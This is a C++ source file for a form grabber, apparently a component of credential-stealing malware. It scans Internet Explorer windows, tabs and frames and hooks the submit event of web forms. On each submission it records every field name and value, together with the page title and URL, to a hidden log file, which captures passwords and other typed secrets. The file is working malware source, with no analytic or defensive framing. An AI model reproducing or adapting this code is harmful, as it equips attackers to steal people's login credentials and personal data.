#include "formgrabber.h"

WCHAR CurrentTitle[256];

template <class T>
HRESULT CWinSink<T>::Init(T* pWin, IID rid)
{
	HRESULT hr = NOERROR;
	LPCONNECTIONPOINTCONTAINER pCPC = NULL;

	if (m_pWin){
		m_pWin.Release();
	}
	m_pWin = pWin;

	if (FAILED(hr = pWin->QueryInterface(IID_IConnectionPointContainer, (LPVOID*)&pCPC))){
		goto Error;
	}

	if (FAILED(hr = pCPC->FindConnectionPoint(rid, &m_pCP))){
		goto Error;
	}

	m_hrConnected = m_pCP->Advise((LPUNKNOWN)this, &m_dwCookie);

Error:
	if (pCPC) pCPC->Release();
	return hr;
}

template <class T>
STDMETHODIMP CWinSink<T>::QueryInterface(REFIID riid, LPVOID* ppv)
{
	*ppv = NULL;

	if (NULL == ppv){
		AddRef();
		return E_POINTER;
	}

	if (riid == IID_IDispatch || riid == IID_IUnknown){
		AddRef();
		return (*ppv = this, S_OK);
	}

	if(riid == IID_IHTMLFormElement) // bogus hack to test if onsubmit event already set
		return S_OK ;

	return E_NOINTERFACE;
}

template <class T>
STDMETHODIMP_(ULONG) CWinSink<T>::AddRef(){
	return ++m_dwRef;
}

template <class T>
STDMETHODIMP_(ULONG) CWinSink<T>::Release(){
	if(--m_dwRef == 0){
		delete this;
		return 0;
	}
	return m_dwRef;
}

template <class T>
STDMETHODIMP CWinSink<T>::Invoke(DISPID dispIdMember,
            REFIID riid,
            LCID lcid,
            WORD wFlags,
            DISPPARAMS __RPC_FAR *pDispParams,
            VARIANT __RPC_FAR *pVarResult,
            EXCEPINFO __RPC_FAR *pExcepInfo,
            UINT __RPC_FAR *puArgErr)
{
	if (!pVarResult)
	{
		return E_POINTER;
	}

	if(dispIdMember == DISPID_ONSUBMIT){
		HWND hWnd = GetForegroundWindow();
		GetWindowTextW(hWnd, CurrentTitle, sizeof(CurrentTitle));
		PWCHAR Token = wcsrchr(CurrentTitle, '-');
		if(Token > CurrentTitle){
			*(Token - 1) = NULL;
		}
		#ifdef _DEBUG
		dprintf("submit press %S\r\n", CurrentTitle);
		#endif
		EnumChildWindows(hWnd, EnumChildLog, NULL);
	}else{
		return DISP_E_MEMBERNOTFOUND;
	}

	return NOERROR;
}

BOOL CALLBACK EnumChildLog(HWND hWnd, LPARAM lParam){
	CHAR ClassName[64];
	GetClassName(hWnd, ClassName, sizeof(ClassName));
	if(strcmp(ClassName, "Internet Explorer_Server") == 0){
		LRESULT lResult;
		CComQIPtr<IHTMLDocument2> spDoc;
			UINT Ret;
		SendMessageTimeout(hWnd, MsgGETOBJECT, NULL, NULL, NULL, 1000, (PDWORD_PTR)&lResult);
		if(pfObjectFromLresult){
			if(SUCCEEDED((Ret = (*pfObjectFromLresult)(lResult, IID_IHTMLDocument2, NULL, (VOID **)&spDoc)))){
				CComQIPtr<IHTMLWindow2> spWin;
				spDoc->get_parentWindow(&spWin);
				BSTR Name;
				spDoc->get_title(&Name);
				if(wcscmp(CurrentTitle, Name) == 0){
					CComQIPtr<IHTMLFramesCollection2> spFrames;
					CComVariant Item, FrameOut;
					
					if(FAILED(spWin->get_frames(&spFrames))) {return TRUE;}
					LONG FramesLength;
					if(FAILED(spFrames->get_length(&FramesLength))) {return TRUE;}
					
					if(FramesLength == 0){
						spWin.Release();
						spFrames.Release();
						//dprintf("Ldocument contains no frames\r\n");
						goto NoFrames;
					}
					for(INT i = 0; i < FramesLength; i++){
						
						spDoc.Release();
						
						//dprintf("Lnum of frames %d searching frame %d\r\n", FramesLength, i);
						
						Item = i;
						
						if(FAILED(spFrames->item(&Item, &FrameOut))) {return TRUE;}
						spWin.Release();
						if(FrameOut.pdispVal)
						if(FAILED(FrameOut.pdispVal->QueryInterface(IID_IHTMLWindow2, (VOID **)&spWin))) {return TRUE;}
						if(FAILED(spWin->get_document(&spDoc))) {return TRUE;}
						
					NoFrames:
					CComQIPtr<IHTMLElementCollection> spElem;
					if(SUCCEEDED(spDoc->get_all(&spElem))){
						LONG Length;
						if(FAILED(spElem->get_length(&Length))) {return TRUE;}

						for(INT i = 0; i < Length; i++){
							CComQIPtr<IDispatch> lpItem;
							CComQIPtr<IHTMLInputElement> spInput;
							CComQIPtr<IHTMLFormElement> spForm;
								if(FAILED(spElem->item(CComVariant(i), CComVariant(i), &lpItem))) {return TRUE;}

								HRESULT h = -1;
								if(lpItem){
									h = lpItem->QueryInterface(&spInput);
									lpItem.Release();
								}
								if(h < 0){
									continue;
								}else{
									CComBSTR Type;
									if(FAILED(spInput->get_type(&Type.m_str))) {return TRUE;}

										CComBSTR DefValue, Value;
										if(FAILED(spInput->get_value(&Value.m_str))) {return TRUE;}
										if(FAILED(spInput->get_defaultValue(&DefValue.m_str))) {return TRUE;}
										if(!DefValue)
											DefValue = L"(null)";
										if(!Value)
											Value = L"(null)";
										if(wcscmp(DefValue, Value) != 0){
											CComBSTR Title, URL;
											FILE *File = fopen(Config::GetFormlogFilename(), "a");
											//dprintf("---LOGGING FORM---\r\n");
											if(FAILED(spDoc->get_title(&Title.m_str))) {return TRUE;}
											if(FAILED(spDoc->get_URL(&URL.m_str))) {return TRUE;}
											//dprintf(" [%S]\r\n<%S>\r\n", Title, URL);
											fprintf(File, " [%S]\r\n<%S>\r\n", Title, URL);
											spForm.Release();
											if(FAILED(spInput->get_form(&spForm))) {return TRUE;}
											CComQIPtr<IHTMLElement> spElemF;
											if(FAILED(spForm->QueryInterface(&spElemF))) {return TRUE;}
											LONG FormLength;
											if(FAILED(spForm->get_length(&FormLength))) {return TRUE;}
											for(INT i = 0; i < FormLength; i++){
												CComQIPtr<IDispatch> lpItem;
												CComQIPtr<IHTMLInputElement> spInput;
												CComQIPtr<IHTMLSelectElement> spSelect;
												if(FAILED(spForm->item(CComVariant(i), CComVariant(i), &lpItem))) {return TRUE;}
												HRESULT h = -1, h2 = -1;
												if(lpItem){
													h = lpItem->QueryInterface(&spInput);
													h2 = lpItem->QueryInterface(&spSelect);
													lpItem.Release();
												}
												if(h >= 0){
													CComBSTR Name, Value, Type;
													if(FAILED(spInput->get_type(&Type.m_str))) {return TRUE;}
													if(wcscmp(Type, L"submit") != 0 && wcscmp(Type, L"image") != 0 && wcscmp(Type, L"reset") != 0){
														if(FAILED(spInput->get_name(&Name.m_str))) {return TRUE;}
														if(FAILED(spInput->get_value(&Value.m_str))) {return TRUE;}
														if(Value.Length() > 150)
															fprintf(File, "  %S = (too long)\r\n", Name);
														else
															fprintf(File, "  %S = %S\r\n", Name, Value);
													}
												}
												if(h2 >= 0){
													CComBSTR Name, Value;
													if(FAILED(spSelect->get_name(&Name.m_str))) {return TRUE;}
													if(FAILED(spSelect->get_value(&Value.m_str))) {return TRUE;}
														if(Value.Length() > 150)
															fprintf(File, "  %S = (too long)\r\n", Name);
														else
															fprintf(File, "  %S = %S\r\n", Name, Value);
												}
											}

											//dprintf("---ENG OF LOG---\r\n\r\n");
											fprintf(File, "\r\n");
											fclose(File);
											break;
										}
									}
								}
					}
					if(FramesLength == 0)
						break;
					}
				}
			}else{
				#ifdef _DEBUG
				dprintf("%d\r\n",  Ret);
				#endif
			}
		}
	}
	return TRUE;
}

VOID FormGrabberThread::ThreadFunc(VOID){
	#ifdef _DEBUG
	dprintf("FormGrabber thread started\r\n");
	#endif
	if(!OLEACCdll)
		OLEACCdll = LoadLibrary("OLEACC.DLL");
	if(!OLEACCdll)
		return;
	pfObjectFromLresult = (LPOBJECTFROMLRESULT)GetProcAddress(OLEACCdll, "ObjectFromLresult");
	if(!pfObjectFromLresult)
		return;
	MsgGETOBJECT = RegisterWindowMessage("WM_HTML_GETOBJECT");
	CoInitialize(NULL);
	MSG msg;
	EnumThread EnumThread(this);
	while(GetMessage(&msg, NULL, 0, 0) > 0){
		TranslateMessage(&msg);
		DispatchMessage(&msg);

		if(msg.message == WM_APP){
			EnumWindows(EnumWindowsProc, NULL);
		}
	}

}

BOOL CALLBACK FormGrabberThread::EnumWindowsProc(HWND hWnd, LPARAM lParam){
	CHAR ClassName[64];
	GetClassName(hWnd, ClassName, sizeof(ClassName));
	if(strcmp(ClassName, "IEFrame") == 0 || strcmp(ClassName, "CabinetWClass") == 0){
		EnumChildWindows(hWnd, EnumChildProc, NULL);
	}
	return TRUE;
}

BOOL CALLBACK FormGrabberThread::EnumChildProc(HWND hWnd, LPARAM lParam){
	CHAR ClassName[64];
	GetClassName(hWnd, ClassName, sizeof(ClassName));
	if(strcmp(ClassName, "TabWindowClass") == 0 || strcmp(ClassName, "Shell DocObject View") == 0){ // for IE7
		EnumChildWindows(hWnd, EnumChildProc, NULL);
	}else
	if(strcmp(ClassName, "Internet Explorer_Server") == 0){
			if(OLEACCdll){
			CComQIPtr<IDispatch> spDisp;
			CComQIPtr<IHTMLWindow2> spWin;
			CComQIPtr<IHTMLDocument2> spDoc;
			CComQIPtr<IHTMLElementCollection> spElem;
			LRESULT lResult;
			SendMessageTimeout(hWnd, MsgGETOBJECT, NULL, NULL, NULL, 1000, (PDWORD_PTR)&lResult);
			if(pfObjectFromLresult){
				if(SUCCEEDED((*pfObjectFromLresult)(lResult, IID_IHTMLDocument2, NULL, (VOID **)&spDoc))){
					CComQIPtr<IHTMLFramesCollection2> spFrames;
					CComVariant Item, FrameOut;
					if(FAILED(spDoc->get_parentWindow(&spWin))) {return TRUE;}
					//spDoc.Release();
					if(FAILED(spWin->get_frames(&spFrames))) {return TRUE;}
					LONG FramesLength;
					if(FAILED(spFrames->get_length(&FramesLength))) {return TRUE;}
					
					if(FramesLength == 0){
						//dprintf("document contains no frames\r\n");
						spWin.Release();
						spFrames.Release();
						goto NoFrames;
					}
					for(INT i = 0; i < FramesLength; i++){
						spWin.Release();
						spDoc.Release();
						spDisp.Release();
						spElem.Release();
						
						//dprintf("num of frames %d searching frame %d\r\n", FramesLength, i);
						
						Item = i;
						
						if(FAILED(spFrames->item(&Item, &FrameOut))) {return TRUE;}
						if(FrameOut.pdispVal)
						if(FAILED(FrameOut.pdispVal->QueryInterface(IID_IHTMLWindow2, (VOID **)&spWin))) {return TRUE;}
						if(FAILED(spWin->get_document(&spDoc))) {return TRUE;}
						
					NoFrames:
					if(FAILED(spDoc->get_Script(&spDisp))) {return TRUE;}
					spWin = spDisp;
					spDoc.Release();
					if(FAILED(spWin->get_document(&spDoc))) {return TRUE;}
					if(FAILED(spDoc->get_all(&spElem))) {return TRUE;}
					LONG Length;
					if(FAILED(spElem->get_length(&Length))) {return TRUE;}

					for(INT i = 0; i < Length; i++){
					CComQIPtr<IDispatch> lpItem;
					CComQIPtr<IHTMLInputElement> spInput;
					CComQIPtr<IHTMLFormElement> spForm;
						if(FAILED(spElem->item(CComVariant(i), CComVariant(i), &lpItem))) {return TRUE;}
						
						HRESULT h = -1;
						if(lpItem){
						h = lpItem->QueryInterface(&spInput);
						lpItem.Release();
						}
						if(h < 0){
							continue;
						}else{
							CComBSTR Type;
							if(FAILED(spInput->get_type(&Type.m_str))) {return TRUE;}
							
							if(wcscmp(Type, L"submit") == 0 || wcscmp(Type, L"image") == 0){
								if(SUCCEEDED(spInput->get_form(&spForm))){
									//dprintf("form found\r\n");
									VARIANT var;
									if(SUCCEEDED(spForm->get_onsubmit(&var))){
										BOOL Set = FALSE;
										CComPtr<IHTMLFormElement> spTest;
										if(var.pdispVal)
											if(SUCCEEDED(var.pdispVal->QueryInterface(&spTest)))
												Set = TRUE;
										if(!Set){
											var.vt = VT_DISPATCH;
											var.pdispVal = OnSubmitEvent;
											if(SUCCEEDED(OnSubmitEvent->Init(spForm, DIID_HTMLFormElementEvents))){
												if(SUCCEEDED(spForm->put_onsubmit(var))){
													//dprintf("submit event hooked\r\n");
												}
											}
										}
										
									}
								}
							}						
						}

					}
					if(FramesLength == 0)
						break;
					
					}
					
				}
			}
		}
	
	}
	return TRUE;
}